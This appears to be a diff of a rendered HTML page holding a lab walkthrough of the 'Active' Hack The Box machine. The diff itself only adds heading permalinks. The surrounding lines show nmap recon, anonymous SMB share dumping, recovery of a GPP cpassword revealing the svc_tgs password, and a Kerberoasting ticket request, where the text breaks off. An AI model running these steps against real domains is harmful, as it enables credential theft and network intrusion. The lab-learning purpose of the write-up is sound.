@@ -863,11 +863,11 @@
               
                 
                 
-                <h1 id="overview">Overview</h1>
+                <h1 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h1>
 <p><img alt="" src="../assets/image-20210702060427405.png" /></p>
-<h1 id="walkthrough">Walkthrough</h1>
-<h2 id="recon">Recon</h2>
-<h3 id="nmap">nmap</h3>
+<h1 id="walkthrough">Walkthrough<a class="headerlink" href="#walkthrough" title="Permanent link">&para;</a></h1>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
 <p><div class="highlight"><pre><span></span><code>PORT      STATE SERVICE       REASON  VERSION
 <span class="m">53</span>/tcp    open  domain        syn-ack Microsoft DNS <span class="m">6</span>.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 SP1<span class="o">)</span>
 <span class="p">|</span> dns-nsid: 
@@ -890,7 +890,7 @@
 <span class="m">49158</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC
 </code></pre></div>
 By looking into <code>nmap</code> results, we can identify that the host is Domain Controller. </p>
-<h3 id="enumerating-open-shares">Enumerating Open Shares</h3>
+<h3 id="enumerating-open-shares">Enumerating Open Shares<a class="headerlink" href="#enumerating-open-shares" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code>Ξ ~/tmp → smbclient -L <span class="se">\\\\</span><span class="m">10</span>.10.10.100 -U <span class="s1">&#39;&#39;</span> -N                      
 
     Sharename       Type      Comment
@@ -910,7 +910,7 @@ smb: <span class="se">\&gt;</span> recurse on
 smb: <span class="se">\&gt;</span> prompt off
 smb: <span class="se">\&gt;</span> mget *
 </code></pre></div>
-<h3 id="gpp-stored-credentials">GPP Stored Credentials</h3>
+<h3 id="gpp-stored-credentials">GPP Stored Credentials<a class="headerlink" href="#gpp-stored-credentials" title="Permanent link">&para;</a></h3>
 <p>The file contain AD Group Policy Preferences (GPP), lets search for any encrypted password. </p>
 <p>GPP Stored Credentials is old vulnerability which is currently patched, for further reading see the this link: https://adsecurity.org/?p=2288 </p>
 <p>Usually GPP encrypted passwords is stored in the variable <code>cpassword</code> we can use <code>grep</code> to search for <code>cpassword</code> variable: </p>
@@ -923,7 +923,7 @@ active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9
 GPPstillStandingStrong2k18
 </code></pre></div>
 <p><code>svc_tgs</code> user password is <code>GPPstillStandingStrong2k18</code> </p>
-<h3 id="request-spn-service-account-tickets">Request SPN Service Account Tickets</h3>
+<h3 id="request-spn-service-account-tickets">Request SPN Service Account Tickets<a class="headerlink" href="#request-spn-service-account-tickets" title="Permanent link">&para;</a></h3>
 <p>After obtain <code>svc_tgs</code> credentials lets use it to request SPN Service accounts tickets: </p>
 <div class="highlight"><pre><span></span><code>Ξ Active/dump → GetUserSPNs.py -dc-ip <span class="m">10</span>.10.10.100 active.htb/svc_tgs -request 
 Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright <span class="m">2020</span> SecureAuth Corporation
